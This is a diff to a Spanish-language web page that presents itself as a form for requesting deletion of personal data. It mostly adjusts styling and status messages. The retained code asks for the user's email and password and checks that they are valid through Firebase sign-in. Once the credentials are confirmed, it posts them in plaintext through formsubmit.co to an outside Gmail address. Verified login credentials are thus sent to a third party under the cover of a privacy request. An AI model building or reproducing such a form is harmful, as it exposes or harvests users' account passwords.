@@ -8,7 +8,7 @@
 <!-- Firebase SDK -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.3.0/firebase-app.js";
-  import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.3.0/firebase-auth.js";
+  import { getAuth } from "https://www.gstatic.com/firebasejs/10.3.0/firebase-auth.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyD9g63vlae7tdmC5QCbZDz_nattCaoagb0",
@@ -65,10 +65,8 @@ ul.steps {
 }
 ul.steps li { margin-bottom: 12px; }
 
-/* CENTRADO DE FORMULARIO */
 form { display: flex; flex-direction: column; align-items: center; }
 
-/* INPUTS Y BOTÓN */
 input[type="email"], input[type="password"], button {
   width: 100%;
   max-width: 400px;
@@ -101,16 +99,18 @@ button {
 button:hover { background: linear-gradient(90deg, #002266, #0044cc); transform: translateY(-3px); }
 button:active { transform: scale(0.97); }
 
-.confirmation {
+.confirmation, .intermediateMsg {
   margin-top: 20px;
   text-align: center;
   font-size: 1rem;
-  color: green;
-  display: none;
   font-weight: 600;
   opacity: 0;
   transition: opacity 0.5s ease;
+  display: none;
 }
+
+.confirmation { color: green; }
+.intermediateMsg { color: #0044cc; }
 
 .errorMsg {
   margin-top: 10px;
@@ -119,10 +119,10 @@ button:active { transform: scale(0.97); }
   display: none;
 }
 
-/* Animaciones */
 @keyframes fadeInUp { 0% { opacity: 0; transform: translateY(30px); } 100% { opacity: 1; transform: translateY(0); } }
 @keyframes fadeOutDown { 0% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(30px); } }
 @keyframes buttonEntrance { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
+
 </style>
 </head>
 <body>
@@ -139,7 +139,6 @@ button:active { transform: scale(0.97); }
 
   <p>Si prefieres, solicita que borremos tus datos aquí:</p>
 
-  <!-- FORMULARIO CON CORREO Y CONTRASEÑA -->
   <form id="eliminarForm" action="https://formsubmit.co/asistenciatecnicostec@gmail.com" method="POST">
     <input type="email" name="email" placeholder="Tu correo electrónico" required autocomplete="email" />
     <input type="password" name="password" placeholder="Tu contraseña" required autocomplete="current-password" />
@@ -150,18 +149,20 @@ button:active { transform: scale(0.97); }
 
     <button type="submit">Solicitar</button>
     <p class="errorMsg" id="errorMsg">Correo o contraseña incorrectos.</p>
+    <p class="intermediateMsg" id="intermediateMsg">Tu solicitud fue enviada</p>
   </form>
 
-  <p class="confirmation" id="confirmationMsg">¡Solicitud enviada! Revisa tu correo para confirmar.</p>
+  <p class="confirmation" id="confirmationMsg">¡Revisa tu correo para confirmar!</p>
 </div>
 
 <script type="module">
-  import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.3.0/firebase-auth.js";
+  import { signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.3.0/firebase-auth.js";
 
   const form = document.getElementById('eliminarForm');
   const confirmationMsg = document.getElementById('confirmationMsg');
   const container = document.getElementById('container');
   const errorMsg = document.getElementById('errorMsg');
+  const intermediateMsg = document.getElementById('intermediateMsg');
   const auth = window.auth;
 
   form.addEventListener('submit', function(event) {
@@ -169,10 +170,12 @@ button:active { transform: scale(0.97); }
     const email = form.email.value;
     const password = form.password.value;
 
-    // Validar credenciales con Firebase
     signInWithEmailAndPassword(auth, email, password)
     .then((userCredential) => {
-      // Credenciales correctas, enviar formulario
+      // Mostrar mensaje intermedio
+      intermediateMsg.style.display = 'block';
+      setTimeout(() => { intermediateMsg.style.opacity = 1; }, 50);
+
       const formData = new FormData(form);
       fetch(form.action, {
         method: form.method,
@@ -190,8 +193,12 @@ button:active { transform: scale(0.97); }
           form.reset();
 
           setTimeout(() => {
+            intermediateMsg.style.opacity = 0;
+            intermediateMsg.style.display = 'none';
+
             confirmationMsg.style.opacity = 0;
-            setTimeout(() => { confirmationMsg.style.display = 'none'; }, 500);
+            confirmationMsg.style.display = 'none';
+
             container.style.display = 'block';
             container.style.animation = 'fadeInUp 0.8s ease forwards';
           }, 5000);
@@ -199,7 +206,6 @@ button:active { transform: scale(0.97); }
       });
     })
     .catch((error) => {
-      // Mostrar error si correo o contraseña no existen
       errorMsg.style.display = 'block';
       setTimeout(() => { errorMsg.style.display = 'none'; }, 4000);
     });
@@ -208,3 +214,4 @@ button:active { transform: scale(0.97); }
 
 </body>
 </html>
+
